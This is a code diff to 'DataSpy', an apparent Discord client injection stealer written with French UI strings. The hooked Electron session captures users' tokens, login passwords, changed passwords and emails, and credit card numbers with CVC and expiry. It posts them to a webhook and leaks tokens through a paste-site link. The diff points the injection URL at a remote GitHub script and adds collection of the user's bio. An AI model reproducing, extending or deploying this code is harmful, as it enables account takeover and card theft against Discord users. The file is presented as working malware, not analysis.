@@ -16,7 +16,7 @@ var config = {
     "embed-color": 16711718,
 
     creator: "%NAME_CREATOR%",
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/DataSpyGithub/DataSpyGithub/main/Index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
@@ -71,7 +71,7 @@ const makeEmbed = async ({
             },
             
             footer: {
-                text: ""
+                text: "[GitHub](https://github.com/DataSpyGithub)"
             },
 
         }]
@@ -127,7 +127,7 @@ const GetNSFW = (bouki) => {
         case false:
             return ":underage: `NSFW Pas Activer`"
         default:
-            return "je ne voie rien"
+            return "NSFW ---"
     }
 }
 const GetA2F = (bouki) => {
@@ -147,9 +147,9 @@ const parseFriends = friends => {
     var rareFriends = ""
     for (var friend of real) {
         var badges = GetRBadges(friend.user.public_flags)
-        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+        if (badges !== "---") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
     }
-    if (!rareFriends) rareFriends = "aucun amis rare"
+    if (!rareFriends) rareFriends = "---"
     return {
         len: real.length,
         badges: rareFriends
@@ -168,7 +168,7 @@ const parseBilling = billings => {
                 Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
         }
     })
-    if (!Billings) Billings = ":x:"
+    if (!Billings) Billings = "---"
     return Billings
 }
 
@@ -177,7 +177,7 @@ const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
 const GetNitro = r => {
     switch (r.premium_type) {
         default:
-            return ":x:"
+            return "---"
         case 1:
             return "<:946246402105819216:962747802797113365>"
         case 2:
@@ -255,13 +255,11 @@ const FirstTime = async () => {
         var password = data.password
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "DataSpy - ",
+            title: "DataSpy",
             fields: [{
                 name: "Injection Info",
                 value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
@@ -315,6 +313,10 @@ const FirstTime = async () => {
                 value: `\`${Friends.len ?? "---"}\``,
                 inline: !0
             }, {
+                name: "Bio <:sordeal:1087057809071427695>",
+                value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
+                inline: !1
+            }, {
                 name: "Token <a:tokens:1041634540537511957>",
                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
                 inline: !1
@@ -342,8 +344,6 @@ const FirstTime = async () => {
             var password = data.password
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -401,6 +401,10 @@ const FirstTime = async () => {
                 name: "Amis <a:totalfriends:1041641100017946685>",
                 value: `\`${Friends.len ?? "---"}\``,
                 inline: !0
+            }, {
+                name: "Bio <:sordeal:1087057809071427695>",
+                value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
+                inline: !1
             }, {
                 name: "Token <a:tokens:1041634540537511957>",
                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
@@ -502,8 +506,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -514,7 +516,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "DataSpy **Re Connextion**",
+                title: "DataSpy",
                 description: "",
                 color: config['embed-color'],
                 fields: [{
@@ -570,6 +572,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     value: `\`${Friends.len ?? "---"}\``,
                     inline: !0
                 }, {
+                    name: "Bio <:sordeal:1087057809071427695>",
+                    value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
+                    inline: !1
+                }, {
                     name: "Token <a:tokens:1041634540537511957>",
                     value: `\`\`\`${token ?? "---"}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
                     inline: !1
@@ -584,8 +590,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "DataSpy - **Mots de passe changer**",
-                    description: "@everyone",
+                    title: "DataSpy",
+                    description: "",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -648,6 +654,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${Friends.len ?? "---"}\``,
                         inline: !0
                     }, {
+                        name: "Bio <:sordeal:1087057809071427695>",
+                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
+                        inline: !1
+                    }, {
                         name: "Token <a:tokens:1041634540537511957>",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
                         inline: !1
@@ -658,8 +668,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "DataSpy - **Email changer**",
-                    description: "@everyone",
+                    title: "DataSpy",
+                    description: "",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -715,7 +725,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "Bio <:sordeal:1087057809071427695>",
-                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
                         inline: !1
                     }, {
                         name: "Token <a:tokens:1041634540537511957>",
@@ -731,8 +741,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "DataSpy **Carte de credit ajouter**",
-                description: `@everyone`,
+                title: "DataSpy",
+                description: "",
                 color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -796,7 +806,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "Bio <:sordeal:1087057809071427695>",
-                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
                         inline: !1
                     }, {
                         name: "Token <a:tokens:1041634540537511957>",
@@ -808,6 +818,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 params.embeds.push(params2.embeds[0])
                 await post(params)
                 break
-        }TimGaming
+        }
     })
     module.exports = require("./core.asar")
